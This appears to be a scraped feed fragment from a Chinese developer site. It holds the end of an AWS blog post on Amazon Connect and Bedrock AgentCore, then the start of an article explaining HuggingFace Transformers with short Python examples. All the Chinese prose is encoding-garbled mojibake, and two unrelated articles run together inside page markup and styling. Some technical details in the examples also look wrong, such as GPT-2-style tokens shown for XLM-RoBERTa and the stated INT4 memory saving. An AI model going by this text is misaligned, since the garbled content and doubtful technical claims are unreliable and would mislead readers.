<p>æœ¬ç¯‡è®¨è®ºäº†äºšé©¬é€Šäº‘ç§‘æŠ€Amazon Connectå‘¼å«ä¸­å¿ƒæœåŠ¡å’ŒAmazon Bedrock AgentCoreä»¥åŠStrands agentæ¡†æ¶ç»“åˆå®ç°æ™ºèƒ½å®¢æœè‡ªåŠ©æœåŠ¡æœ€ä½³å®è·µã€‚æœ¬åšå®¢ä»ç”¨æˆ·å®é™…éœ€æ±‚å‡ºå‘æä¾›ä¸€ä¸ªå®é™…å¯è¡Œçš„è§£å†³æ–¹æ¡ˆï¼Œç»“åˆæŠ€æœ¯å’Œæˆæœ¬ç»¼åˆè€ƒè™‘æä¾›æœ€ä½³å®è·µã€‚æœ¬è®¾è®¡å……åˆ†è€ƒè™‘å‘¼å«ä¸­å¿ƒçš„ç‰¹æ®Šæ€§ï¼Œé‡‡ç”¨Lambdaï¼ŒAmazon Bedrockï¼ŒAmazon Bedrock AgentCoreï¼ŒStands Agentæ¡†æ¶ç»“åˆæä¾›ç»¼åˆè§£å†³æ–¹æ¡ˆï¼ŒåŒæ—¶æä¾›äº†Amazon Bedrock AgentCore Runtimeå’ŒStands Agentç»“åˆçš„ä»£ç å¹¶å’ŒAmazon Connectå®ç°é›†æˆï¼Œæä¾›Amazon Bedrock AgentCore Memoryé›†æˆåŠè°ƒç”¨ä»£ç å®ç°æ™ºèƒ½å®¢æœä¸Šä¸‹æ–‡è‡ªåŠ¨è®°å¿†åŠŸèƒ½ã€‚æœ¬ç¯‡æä¾›äº†æ•´ä¸ªå®è·µçš„å®Œæ•´ä»£ç åŠå®ç°çš„æ•ˆæœå±•ç¤ºï¼Œï¼Œè®©è¯»è€…å¯ä»¥æ¸…æ¥šäº†è§£å®ç°æ•ˆæœå’ŒæŠ€æœ¯ç»†èŠ‚ã€‚</p>
<p>*<em>å‰è¿°ç‰¹å®šäºšé©¬é€Šäº‘ç§‘æŠ€ç”Ÿæˆå¼äººå·¥æ™ºèƒ½ç›¸å…³çš„æœåŠ¡ç›®å‰åœ¨äºšé©¬é€Šäº‘ç§‘æŠ€æµ·å¤–åŒºåŸŸå¯ç”¨ã€‚äºšé©¬é€Šäº‘ç§‘æŠ€ä¸­å›½åŒºåŸŸç›¸å…³äº‘æœåŠ¡ç”±è¥¿äº‘æ•°æ®å’Œå…‰ç¯æ–°ç½‘è¿è¥ï¼Œå…·ä½“ä¿¡æ¯ä»¥ä¸­å›½åŒºåŸŸå®˜ç½‘ä¸ºå‡†ã€‚</em></p>
<p><strong>æœ¬ç¯‡ä½œè€…</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a85c843075441d8a972d86b33be860b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766400242&amp;x-signature=p%2Fzxjbd7seG7U%2FJuuAV2slYkty0%3D" alt="9.webp" loading="lazy"/></p>
<blockquote>
<p>æœ¬æœŸæœ€æ–°å®éªŒã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_Juejintail_0415%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_Juejintail_0415" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_Juejintail_0415&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_Juejintail_0415" ref="nofollow noopener noreferrer">å¤šæ¨¡ä¸€ç«™é€š â€”â€” Amazon Bedrock ä¸Šçš„åŸºç¡€æ¨¡å‹åˆä½“éªŒ</a>ã€‹</p>
<p>âœ¨ ç²¾å¿ƒè®¾è®¡ï¼Œæ—¨åœ¨å¼•å¯¼æ‚¨æ·±å…¥æ¢ç´¢Amazon Bedrockçš„æ¨¡å‹é€‰æ‹©ä¸è°ƒç”¨ã€æ¨¡å‹è‡ªåŠ¨åŒ–è¯„ä¼°ä»¥åŠå®‰å…¨å›´æ (Guardrail)ç­‰é‡è¦åŠŸèƒ½ã€‚æ— éœ€ç®¡ç†åŸºç¡€è®¾æ–½ï¼Œåˆ©ç”¨äºšé©¬é€ŠæŠ€æœ¯ä¸ç”Ÿæ€ï¼Œå¿«é€Ÿé›†æˆä¸éƒ¨ç½²ç”Ÿæˆå¼AIæ¨¡å‹èƒ½åŠ›ã€‚</p>
<p>â©ï¸[<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_Juejintail_0415%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_Juejintail_0415" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_Juejintail_0415&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_Juejintail_0415" ref="nofollow noopener noreferrer">ç‚¹å‡»è¿›å…¥å®éªŒ</a>] å³åˆ»å¼€å¯  AI å¼€å‘ä¹‹æ—…</p>
<p>æ„å»ºæ— é™, æ¢ç´¢å¯ç¨‹ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æŠŠå¤§æ¨¡å‹è£…è¿›å£è¢‹ï¼šHuggingFaceå¦‚ä½•è®©AIæ°‘ä¸»åŒ–æˆä¸ºç°å®]]></title>    <link>https://juejin.cn/post/7583913535270469642</link>    <guid>https://juejin.cn/post/7583913535270469642</guid>    <pubDate>2025-12-15T10:02:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583913535270469642" data-draft-id="7583878719543623689" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æŠŠå¤§æ¨¡å‹è£…è¿›å£è¢‹ï¼šHuggingFaceå¦‚ä½•è®©AIæ°‘ä¸»åŒ–æˆä¸ºç°å®"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-15T10:02:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‰ç«¯å¼€å‘å·¥ç¨‹å¸ˆè¯·æ±‚å‡ºæˆ˜"/> <meta itemprop="url" content="https://juejin.cn/user/4222596374865550"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æŠŠå¤§æ¨¡å‹è£…è¿›å£è¢‹ï¼šHuggingFaceå¦‚ä½•è®©AIæ°‘ä¸»åŒ–æˆä¸ºç°å®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4222596374865550/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‰ç«¯å¼€å‘å·¥ç¨‹å¸ˆè¯·æ±‚å‡ºæˆ˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:02:51.000Z" title="Mon Dec 15 2025 10:02:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å¦‚æœä½ åœ¨2025å¹´è¿˜è§‰å¾—å¤§æ¨¡å‹æ˜¯ç§‘æŠ€å·¨å¤´çš„ä¸“åˆ©ï¼Œé‚£ä½ å¯èƒ½é”™è¿‡äº†AIæ°‘ä¸»åŒ–æœ€å…³é”®çš„ä¸€æ­¥â€”â€”è€Œè¿™ä¸€æ­¥ï¼Œæ˜¯ç”±ä¸€ä¸ªåä¸ºHuggingFaceçš„å¹³å°å®Œæˆçš„ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä»â€œå®éªŒå®¤çå“â€åˆ°â€œå¼€å‘è€…æ ‡é…â€çš„èœ•å˜</h2>
<p>ä¸‰å¹´å‰ï¼Œæƒ³è¦ç”¨ä¸Šæœ€å…ˆè¿›çš„å¤§æ¨¡å‹æ˜¯ä»€ä¹ˆä½“éªŒï¼Ÿ</p>
<p>ä½ éœ€è¦å…ˆè¯»é€å‡ ç™¾é¡µçš„è®ºæ–‡ï¼Œé…ç½®å¤æ‚çš„CUDAç¯å¢ƒï¼Œå¤„ç†å„ç§ä¾èµ–å†²çªï¼Œæœ€ååœ¨æ˜‚è´µçš„GPUä¸Šæˆ˜æˆ˜å…¢å…¢åœ°è¿è¡Œâ€”â€”ç»“æœå¾ˆå¯èƒ½å› ä¸ºä¸€ä¸ªç‰ˆæœ¬ä¸å…¼å®¹è€Œå‰åŠŸå°½å¼ƒã€‚</p>
<p>ä»Šå¤©å‘¢ï¼Ÿæ‰“å¼€Pythonï¼Œä¸‰è¡Œä»£ç ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> pipeline
chatbot = pipeline(<span class="hljs-string">"text-generation"</span>, model=<span class="hljs-string">"Qwen/Qwen2.5-7B"</span>)
response = chatbot(<span class="hljs-string">"å¸®æˆ‘å†™ä¸€æ®µäº§å“ä»‹ç»"</span>)
</code></pre>
<p>ä¸€ä¸ªèƒ½å¯¹è¯ã€èƒ½å†™ä½œã€èƒ½ç¼–ç¨‹çš„æ™ºèƒ½åŠ©æ‰‹å°±åœ¨ä½ çš„ç¬”è®°æœ¬ç”µè„‘ä¸Šè·‘èµ·æ¥äº†ã€‚è¿™ä¸ªè½¬å˜çš„æ ¸å¿ƒæ¨æ‰‹ï¼Œæ­£æ˜¯HuggingFaceã€‚</p>
<p>ä½†HuggingFaceçš„ä»·å€¼è¿œä¸æ­¢â€œè®©è°ƒç”¨æ¨¡å‹å˜ç®€å•â€ã€‚å®ƒçœŸæ­£åšçš„ï¼Œæ˜¯<strong>é‡æ„äº†æ•´ä¸ªAIå¼€å‘çš„ä»·å€¼é“¾</strong>ã€‚</p>
<h2 data-id="heading-1">ç¬¬ä¸€éƒ¨åˆ†ï¼šä¸ºä»€ä¹ˆAIä¸–ç•Œéœ€è¦ä¸€ä¸ªâ€œæ¨¡å‹ä»“åº“â€ï¼Ÿ</h2>
<h3 data-id="heading-2">1.1 å¤§æ¨¡å‹çš„â€œå¯’æ­¦çºªå¤§çˆ†å‘â€ä¸éšä¹‹è€Œæ¥çš„æ··ä¹±</h3>
<p>2022-2024å¹´ï¼Œæˆ‘ä»¬è§è¯äº†å¤§æ¨¡å‹çš„â€œå¯’æ­¦çºªå¤§çˆ†å‘â€ï¼š</p>
<ul>
<li>OpenAIçš„GPTç³»åˆ—ä»3.5è¿­ä»£åˆ°4o</li>
<li>è°·æ­Œçš„PaLMã€Geminiæ¥è¿å‘å¸ƒ</li>
<li>Metaå¼€æºäº†Llamaç³»åˆ—ï¼Œå½»åº•ç‚¹ç‡ƒäº†å¼€æºç¤¾åŒºçš„æ¿€æƒ…</li>
<li>ä¸­å›½çš„é˜¿é‡Œé€šä¹‰ã€ç™¾åº¦æ–‡å¿ƒã€æ™ºè°±ChatGLMã€æ·±åº¦æ±‚ç´¢DeepSeekç­‰ç™¾èŠ±é½æ”¾</li>
</ul>
<p>ä½†ç¹è£èƒŒåæ˜¯å·¨å¤§çš„æ··ä¹±ï¼šæ¯ä¸ªæ¡†æ¶éƒ½æœ‰è‡ªå·±çš„APIï¼Œæ¯ä¸ªæ¨¡å‹éƒ½æœ‰è‡ªå·±çš„æƒé‡æ ¼å¼ï¼Œæ¯ç¯‡è®ºæ–‡éƒ½æœ‰è‡ªå·±çš„é¢„å¤„ç†æ­¥éª¤ã€‚</p>
<p>å¼€å‘è€…é¢ä¸´çš„é€‰æ‹©å›°å¢ƒï¼šæˆ‘æ˜¯è¯¥ç”¨PyTorchè¿˜æ˜¯TensorFlowï¼Ÿè¯¥ç”¨HuggingFace Transformersè¿˜æ˜¯ç›´æ¥è°ƒç”¨åŸå‚SDKï¼Ÿæ¨¡å‹æƒé‡æ˜¯.safetensorsæ ¼å¼è¿˜æ˜¯.binæ ¼å¼ï¼Ÿ</p>
<p>è¿™ç§ç¢ç‰‡åŒ–ä¸¥é‡é˜»ç¢äº†æŠ€æœ¯çš„æ™®åŠã€‚å°±åƒæ™ºèƒ½æ‰‹æœºæ—©æœŸï¼Œæ¯ä¸ªæ‰‹æœºå‚å•†éƒ½æœ‰è‡ªå·±çš„å……ç”µæ¥å£â€”â€”ç›´åˆ°Type-Cç»Ÿä¸€äº†å¤©ä¸‹ã€‚</p>
<h3 data-id="heading-3">1.2 HuggingFaceçš„â€œç»Ÿä¸€åœºè®ºâ€</h3>
<p>HuggingFaceåšäº†ä¸€ä»¶çœ‹ä¼¼ç®€å•å´æå…·è¿œè§çš„äº‹ï¼š<strong>ä¸ºæ‰€æœ‰å¤§æ¨¡å‹å®šä¹‰äº†ä¸€å¥—é€šç”¨æ¥å£</strong>ã€‚</p>
<p>è¿™å°±åƒUSBåè®®ä¸ºæ‰€æœ‰å¤–è®¾å®šä¹‰äº†é€šä¿¡æ ‡å‡†ã€‚æ— è®ºåº•å±‚æ˜¯Transformerã€RNNè¿˜æ˜¯CNNï¼Œæ— è®ºæ¨¡å‹æ¥è‡ªè°·æ­Œã€Metaè¿˜æ˜¯ä¸­å›½çš„åˆ›ä¸šå…¬å¸ï¼Œåœ¨HuggingFaceçš„ä¸–ç•Œé‡Œï¼Œå®ƒä»¬éƒ½éµå¾ªåŒæ ·çš„è°ƒç”¨è§„èŒƒã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åŠ è½½ä»»ä½•æ¨¡å‹ï¼Œéƒ½æ˜¯åŒæ ·çš„ä¸‰è¡Œä»£ç </span>
<span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoModel, AutoTokenizer

model = AutoModel.from_pretrained(<span class="hljs-string">"æ¨¡å‹åç§°"</span>)
tokenizer = AutoTokenizer.from_pretrained(<span class="hljs-string">"æ¨¡å‹åç§°"</span>)
</code></pre>
<p>è¿™ç§ç»Ÿä¸€å¸¦æ¥çš„æ•ˆç‡æå‡æ˜¯æŒ‡æ•°çº§çš„ã€‚å¼€å‘è€…ä¸å†éœ€è¦ä¸ºæ¯ä¸ªæ–°æ¨¡å‹é‡å­¦ä¸€å¥—APIï¼Œä¼ä¸šä¸å†éœ€è¦ä¸ºæ¯ä¸ªæ¡†æ¶ç»´æŠ¤ä¸€å¥—åŸºç¡€è®¾æ–½ã€‚</p>
<h2 data-id="heading-4">ç¬¬äºŒéƒ¨åˆ†ï¼šTransformersåº“â€”â€”ä¸åªæ˜¯åŠ è½½æ¨¡å‹çš„å·¥å…·</h2>
<h3 data-id="heading-5">2.1 â€œè‡ªåŠ¨â€èƒŒåçš„æ™ºèƒ½</h3>
<p>è¡¨é¢ä¸Šçœ‹ï¼Œ<code>AutoModel.from_pretrained()</code>åªæ˜¯åŠ è½½æ¨¡å‹ã€‚ä½†åœ¨è¿™è¡Œç®€å•çš„ä»£ç èƒŒåï¼Œæ˜¯ä¸€ä¸ªå¤æ‚çš„æ™ºèƒ½ç³»ç»Ÿï¼š</p>
<p><strong>è‡ªåŠ¨æ¶æ„æ£€æµ‹</strong>ï¼šå½“ä½ ä¼ å…¥"bert-base-chinese"æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ï¼š</p>
<ol>
<li>ä»HuggingFace Hubä¸‹è½½æ¨¡å‹é…ç½®</li>
<li>æ ¹æ®é…ç½®ä¸­çš„<code>model_type</code>å­—æ®µè¯†åˆ«è¿™æ˜¯BERTæ¶æ„</li>
<li>åŠ¨æ€åŠ è½½å¯¹åº”çš„æ¨¡å‹ç±»</li>
<li>åº”ç”¨æ­£ç¡®çš„æƒé‡åˆå§‹åŒ–æ–¹å¼</li>
</ol>
<p><strong>è‡ªåŠ¨è®¾å¤‡ç®¡ç†</strong>ï¼šå½“ä½ æœ‰ä¸€å°å¸¦24GBæ˜¾å­˜çš„4090å’Œ64GBå†…å­˜çš„ç”µè„‘æ—¶ï¼š</p>
<pre><code class="hljs language-python" lang="python">model = AutoModel.from_pretrained(<span class="hljs-string">"Qwen/Qwen2.5-14B"</span>, device_map=<span class="hljs-string">"auto"</span>)
</code></pre>
<p>è¿™è¡Œä»£ç ä¼šè‡ªåŠ¨å°†æ¨¡å‹çš„ä¸åŒå±‚åˆ†é…åˆ°GPUå’ŒCPUä¸Šï¼Œç”šè‡³å®ç°å±‚é—´æµæ°´çº¿ï¼Œè®©å¤§æ¨¡å‹èƒ½åœ¨â€œå°â€è®¾å¤‡ä¸Šè¿è¡Œã€‚</p>
<p><strong>è‡ªåŠ¨é‡åŒ–æ”¯æŒ</strong>ï¼šå½“æ¨¡å‹å¤ªå¤§æ—¶ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> BitsAndBytesConfig
quant_config = BitsAndBytesConfig(load_in_4bit=<span class="hljs-literal">True</span>)
model = AutoModel.from_pretrained(<span class="hljs-string">"æ¨¡å‹åç§°"</span>, quantization_config=quant_config)
</code></pre>
<p>è‡ªåŠ¨å°†FP32æƒé‡è½¬æ¢ä¸ºINT4ï¼Œæ˜¾å­˜å ç”¨å‡å°‘75%ï¼Œæ€§èƒ½æŸå¤±ä¸åˆ°5%ã€‚</p>
<h3 data-id="heading-6">2.2 Pipelineï¼šä»â€œå‡½æ•°è°ƒç”¨â€åˆ°â€œä»»åŠ¡æŠ½è±¡â€</h3>
<p>å¦‚æœè¯´<code>AutoModel</code>æ˜¯ç»Ÿä¸€äº†æ¨¡å‹çš„â€œåŠ è½½æ–¹å¼â€ï¼Œé‚£ä¹ˆ<code>pipeline</code>åˆ™æ˜¯ç»Ÿä¸€äº†æ¨¡å‹çš„â€œä½¿ç”¨æ–¹å¼â€ã€‚</p>
<p>ä¼ ç»ŸAIå¼€å‘ä¸­ï¼Œæ¯ä¸ªä»»åŠ¡éƒ½æ˜¯ä¸€å¥—ç‹¬ç«‹æµç¨‹ï¼š</p>
<ul>
<li>æ–‡æœ¬åˆ†ç±»ï¼šåˆ†è¯â†’ç¼–ç â†’æ¨¡å‹æ¨ç†â†’Softmaxâ†’å–æœ€å¤§å€¼</li>
<li>å‘½åå®ä½“è¯†åˆ«ï¼šåˆ†è¯â†’ç¼–ç â†’æ¨¡å‹æ¨ç†â†’CRFè§£ç â†’å®ä½“åˆå¹¶</li>
<li>æ–‡æœ¬ç”Ÿæˆï¼šåˆ†è¯â†’ç¼–ç â†’è‡ªå›å½’ç”Ÿæˆâ†’è§£ç â†’åå¤„ç†</li>
</ul>
<p><code>pipeline</code>æŠŠè¿™äº›æµç¨‹å…¨éƒ¨å°è£…ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ‰€æœ‰ä»»åŠ¡ï¼ŒåŒä¸€å¥—API</span>
classifier = pipeline(<span class="hljs-string">"text-classification"</span>)  <span class="hljs-comment"># æ–‡æœ¬åˆ†ç±»</span>
ner = pipeline(<span class="hljs-string">"ner"</span>)                         <span class="hljs-comment"># å‘½åå®ä½“è¯†åˆ«</span>
generator = pipeline(<span class="hljs-string">"text-generation"</span>)       <span class="hljs-comment"># æ–‡æœ¬ç”Ÿæˆ</span>
translator = pipeline(<span class="hljs-string">"translation"</span>)          <span class="hljs-comment"># ç¿»è¯‘</span>
</code></pre>
<p>æ›´é‡è¦çš„æ˜¯ï¼Œ<code>pipeline</code>å†…ç½®äº†<strong>æœ€ä½³å®è·µ</strong>ï¼š</p>
<ul>
<li>è‡ªåŠ¨å¤„ç†å¡«å……å’Œæˆªæ–­</li>
<li>è‡ªåŠ¨æ‰¹å¤„ç†æå‡æ€§èƒ½</li>
<li>è‡ªåŠ¨è®¾å¤‡ç®¡ç†</li>
<li>é”™è¯¯å¤„ç†å’Œé‡è¯•æœºåˆ¶</li>
</ul>
<h3 data-id="heading-7">2.3 Tokenizerçš„è‰ºæœ¯ï¼šä»å­—ç¬¦åˆ°å‘é‡çš„é­”æ³•</h3>
<p>å¤§æ¨¡å‹ä¸ç†è§£æ–‡å­—ï¼Œåªç†è§£æ•°å­—ã€‚å°†æ–‡å­—è½¬æ¢ä¸ºæ•°å­—çš„è¿‡ç¨‹å°±æ˜¯åˆ†è¯ï¼ˆTokenizationï¼‰ã€‚è¿™çœ‹ä¼¼ç®€å•ï¼Œå®åˆ™å……æ»¡ç„æœºã€‚</p>
<p><strong>ä¸­æ–‡åˆ†è¯çš„ä¸‰ç§æµæ´¾</strong>ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 1. å­—åˆ†è¯ï¼ˆBERTé£æ ¼ï¼‰</span>
tokenizer = AutoTokenizer.from_pretrained(<span class="hljs-string">"bert-base-chinese"</span>)
tokens = tokenizer.tokenize(<span class="hljs-string">"è‡ªç„¶è¯­è¨€å¤„ç†"</span>)  <span class="hljs-comment"># ['è‡ª', 'ç„¶', 'è¯­', 'è¨€', 'å¤„', 'ç†']</span>

<span class="hljs-comment"># 2. è¯åˆ†è¯ï¼ˆGPTé£æ ¼ï¼‰</span>
tokenizer = AutoTokenizer.from_pretrained(<span class="hljs-string">"gpt2-chinese"</span>)
tokens = tokenizer.tokenize(<span class="hljs-string">"è‡ªç„¶è¯­è¨€å¤„ç†"</span>)  <span class="hljs-comment"># ['è‡ªç„¶', 'è¯­è¨€', 'å¤„ç†']</span>

<span class="hljs-comment"># 3. å­è¯åˆ†è¯ï¼ˆBPE/WordPieceï¼‰</span>
tokenizer = AutoTokenizer.from_pretrained(<span class="hljs-string">"xlm-roberta-base"</span>)
tokens = tokenizer.tokenize(<span class="hljs-string">"natural language processing"</span>)  <span class="hljs-comment"># ['natural', 'Ä language', 'Ä processing']</span>
</code></pre>
<p>æ¯ç§åˆ†è¯æ–¹å¼éƒ½æœ‰å…¶ä¼˜ç¼ºç‚¹ï¼š</p>
<ul>
<li><strong>å­—åˆ†è¯</strong>ï¼šè¯è¡¨å°ï¼ˆ2ä¸‡å­—å·¦å³ï¼‰ï¼Œä½†è¯­ä¹‰ç²’åº¦ç²—</li>
<li><strong>è¯åˆ†è¯</strong>ï¼šè¯­ä¹‰ç²’åº¦ç»†ï¼Œä½†è¯è¡¨å¤§ï¼ˆ5ä¸‡-50ä¸‡ï¼‰ï¼ŒOOVï¼ˆæœªç™»å½•è¯ï¼‰é—®é¢˜ä¸¥é‡</li>
<li><strong>å­è¯åˆ†è¯</strong>ï¼šå¹³è¡¡äº†ä¸¤è€…ï¼Œä½†éœ€è¦å¤æ‚çš„è®­ç»ƒç®—æ³•</li>
</ul>
<p>HuggingFaceçš„Tokenizeræœ€å‰å®³çš„åœ°æ–¹åœ¨äºï¼š<strong>å®ƒè®©å¼€å‘è€…å®Œå…¨ä¸ç”¨å…³å¿ƒè¿™äº›ç»†èŠ‚</strong>ã€‚æ— è®ºåº•å±‚ç”¨ä»€ä¹ˆåˆ†è¯ç®—æ³•ï¼ŒAPIéƒ½æ˜¯ä¸€æ ·çš„ã€‚</p>
<h2 data-id="heading-8">ç¬¬ä¸‰éƒ¨åˆ†ï¼šDatasetsåº“â€”â€”AIçš„â€œæ•°æ®åŠ æ²¹ç«™â€</h2>
<h3 data-id="heading-9">3.1 æ•°æ®ï¼šAIçš„çŸ³æ²¹ï¼Œä¹Ÿæ˜¯æœ€æ·±çš„æŠ¤åŸæ²³</h3>
